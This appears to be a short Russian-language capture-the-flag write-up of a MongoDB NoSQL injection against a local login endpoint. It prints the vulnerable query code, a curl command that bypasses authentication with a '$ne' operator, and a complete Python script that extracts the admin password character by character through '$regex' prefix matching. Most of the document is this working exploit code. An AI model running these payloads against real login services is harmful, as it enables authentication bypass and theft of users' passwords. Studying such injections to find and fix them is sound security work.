Уязвимая часть:

```python
query = {
    'username': username,
    'password': password  # Vulnerable! Accepts dict with MongoDB operators
}
user = users_collection.find_one(query)
```

Подтверждение уязвимости:

```bash
curl -X POST http://localhost:5000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":""}}'
```

Скрипт для извлечения пароля:
```python
import requests
import string

url = "http://localhost:5000/login"
flag = ""
charset = string.ascii_letters + string.digits + "{}_"
print("[*] Starting flag extraction...")
while True:
    found = False
    for char in charset:
        test_flag = flag + char
        payload = {
            "username": "admin",
            "password": {"$regex": f"^{test_flag}"}
        }
        
        try:
            response = requests.post(url, json=payload)
            
            if response.status_code == 200:
                flag = test_flag
                print(f"[+] Found: {flag}")
                found = True
                
                if char == "}":
                    print(f"\n[+] COMPLETE FLAG: {flag}")
                    exit(0)
                break
        except Exception as e:
            print(f"[-] Error: {e}")
            continue
    
    if not found:
        print(f"[-] Failed to find next character after: {flag}")
        break

print(f"\n[+] Extracted: {flag}")
```
